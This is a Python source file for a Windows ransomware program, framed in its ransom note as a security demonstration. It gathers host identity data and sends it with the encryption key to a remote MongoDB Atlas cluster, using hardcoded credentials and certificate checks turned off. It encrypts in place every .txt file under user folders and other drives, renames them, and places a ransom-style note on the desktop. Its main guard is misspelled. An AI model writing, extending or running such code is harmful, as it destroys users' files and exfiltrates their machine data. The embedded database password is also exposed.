import socket
import platform
import uuid
import os
import psutil
import win32com.client
import logging
import sys
from cryptography.fernet import Fernet
from datetime import datetime
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi


def get_machine_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                for elements in range(0, 48, 8)][::-1])

        os_info = platform.platform()

        try:
            username = os.getlogin()
        except:
            username = "Unknown"

        machine_data = {
            "hostname": hostname,
            "ip_address": ip_address,
            "mac_address": mac_address,
            "os_info": os_info,
            "username": username
        }

        logging.info(f"Collected machine info: {hostname}, {ip_address}, {os_info}")
        return machine_data
    except Exception as e:
        logging.error(f"Error collecting machine info: {str(e)}")
        return {"error": str(e)}


def send_key_to_atlas(encryption_key):
    uri = "mongodb+srv://mannatnayak22:G3dZ9fUZeCf6Fstm@cluster0.dr05mbd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

    try:
        logging.info("Connecting to MongoDB Atlas...")
        # Add SSL certificate verification bypass
        client = MongoClient(uri,
                             server_api=ServerApi('1'),
                             serverSelectionTimeoutMS=5000,
                             tlsAllowInvalidCertificates=True)  # Add this parameter to bypass certificate verification

        client.admin.command('ping')
        logging.info("Successfully connected to MongoDB!")
    except Exception as e:
        logging.error(f"MongoDB connection failed: {str(e)}")
        return False

    db = client["test"]
    collection = db["encryptionkeys"]

    machine_data = get_machine_info()
    if "error" in machine_data:
        logging.error("Failed to get machine information for MongoDB document")
        return False

    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    document = {
        **machine_data,
        "encryption_key": encryption_key,
        "state": "secured",
        "sent_at": current_time
    }

    try:
        result = collection.insert_one(document)
        logging.info(f"Document inserted with ID: {result.inserted_id}")
        return True
    except Exception as e:
        logging.error(f"Failed to insert document to MongoDB: {str(e)}")
        return False


def get_paths():
    dirs = []
    user_dir = os.path.expanduser("~")
    subfolders = [
        "Documents", "Downloads", "Desktop", "Pictures", "Videos", "Music",
        "AppData\\Local", "AppData\\Roaming", "AppData\\LocalLow"
    ]

    for folder in subfolders:
        path = os.path.join(user_dir, folder)
        if os.path.exists(path):
            dirs.append(path)

    sys_drive = os.getenv("SystemDrive", "C:").upper()
    partitions = psutil.disk_partitions()
    for p in partitions:
        if "cdrom" in p.opts or not os.path.exists(p.mountpoint):
            continue
        drive = p.device
        if not drive.upper().startswith(sys_drive):
            dirs.append(p.mountpoint)

    return dirs


def encrypt_file(file_path, key):
    try:
        # Check if the file exists and is not empty
        if not os.path.exists(file_path):
            logging.warning(f"File does not exist: {file_path}")
            return False

        if os.path.getsize(file_path) == 0:
            logging.warning(f"Skipping empty file: {file_path}")
            return False

        # Read the file content
        with open(file_path, "rb") as f:
            data = f.read()

        # Encrypt the content
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        # Write the encrypted content back
        with open(file_path, "wb") as f:
            f.write(encrypted)

        logging.info(f"Encrypted: {file_path}")
        return True
    except PermissionError:
        logging.warning(f"Permission denied for file: {file_path}")
        return False
    except Exception as e:
        logging.error(f"Error encrypting {file_path}: {str(e)}")
        return False


def encrypt_txt_files(paths, key):
    encrypted_count = 0
    total_files_found = 0
    skipped_files = 0

    for path in paths:
        logging.info(f"Scanning directory: {path}")
        try:
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith('.txt'):
                        total_files_found += 1
                        file_path = os.path.join(root, file)

                        # Try to encrypt the file
                        if encrypt_file(file_path, key):
                            encrypted_count += 1
                        else:
                            skipped_files += 1
        except Exception as e:
            logging.error(f"Error scanning directory {path}: {str(e)}")

    logging.info(f"Text files found: {total_files_found}")
    logging.info(f"Files encrypted: {encrypted_count}")
    logging.info(f"Files skipped: {skipped_files}")
    return encrypted_count


def create_ransom_note():
    ransom_path = os.path.join(os.path.expanduser("~"), "Desktop", "README_IMPORTANT.html")
    with open(ransom_path, "w") as f:
        f.write("""
        <html>
        <head><title>System Security Project - Files Encrypted</title></head>
        <body>
            <h1>System Security Project Demonstration</h1>
            <p>All TXT files have been encrypted as part of the security simulation.</p>
            <p>This is a demonstration of a ransomware security project.</p>
            <p>The encryption key has been stored in MongoDB Atlas for recovery purposes.</p>
            <p><strong>Note:</strong> This is only a security demonstration project.</p>
        </body>
        </html>
        """)
    return ransom_path


def create_desktop_shortcut(path):
    try:
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut_path = os.path.join(os.path.expanduser("~"), "Desktop", "README_IMPORTANT.lnk")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = path
        shortcut.IconLocation = "C:\\Windows\\System32\\shell32.dll,77"  # Using an alert/warning icon
        shortcut.save()
        print(f"Created shortcut at: {shortcut_path}")
    except Exception as e:
        print(f"Error creating shortcut: {str(e)}")


def rename_encrypted_files(target_dirs):
    renamed_count = 0
    for path in target_dirs:
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith('.txt'):
                    original_path = os.path.join(root, file)
                    new_path = original_path + ".encrypted"
                    try:
                        os.rename(original_path, new_path)
                        renamed_count += 1
                    except Exception as e:
                        print(f"Failed to rename {original_path}: {str(e)}")

    print(f"Total files renamed: {renamed_count}")
    return renamed_count


# Set up logging configuration
def setup_logging():
    log_dir = os.path.join(os.path.expanduser("~"), "Documents", "SecurityProject")
    os.makedirs(log_dir, exist_ok=True)

    log_file = os.path.join(log_dir, "encryption_log.txt")

    # Configure logging to file and console
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )

    logging.info("=" * 50)
    logging.info("Starting encryption process")
    logging.info("=" * 50)
    return log_file


if __name__ == "_main_":
    try:
        # Set up logging
        log_file_path = setup_logging()

        # Generate encryption key
        key = Fernet.generate_key()
        logging.info(f"Generated encryption key: {key.decode()}")

        # Send key to MongoDB Atlas first - important for recovery
        logging.info("Connecting to MongoDB Atlas...")
        success = send_key_to_atlas(key.decode())
        if not success:
            logging.error("Failed to store encryption key in MongoDB. Aborting operation.")
            input("Press Enter to exit...")
            sys.exit(1)  # Use sys.exit instead of exit
        logging.info("Successfully stored key in MongoDB Atlas")

        # Get paths to scan
        logging.info("Identifying directories to scan...")
        paths_to_scan = get_paths()
        logging.info(f"Found {len(paths_to_scan)} directories to scan")

        # Encrypt only TXT files
        logging.info("Starting encryption of TXT files...")
        encrypted_count = encrypt_txt_files(paths_to_scan, key)

        # Rename encrypted files to show they've been encrypted
        logging.info("Renaming encrypted files...")
        renamed_count = rename_encrypted_files(paths_to_scan)

        # Create and place the ransom note
        logging.info("Creating notification...")
        ransom_note_path = create_ransom_note()
        create_desktop_shortcut(ransom_note_path)

        logging.info(f"Operation completed: {encrypted_count} .txt files encrypted")
        logging.info(f"Log file saved to: {log_file_path}")

        # Show completion message
        print("\nOperation completed successfully!")
        print(f"Encrypted {encrypted_count} .txt files")
        print(f"Log file saved to: {log_file_path}")
        print("\nPress Enter to exit...")
        input()

    except Exception as e:
        logging.exception(f"Unhandled error occurred: {str(e)}")
        print(f"\nAn error occurred: {str(e)}")
        print("Check the log file for details.")
        print("\nPress Enter to exit...")
        input()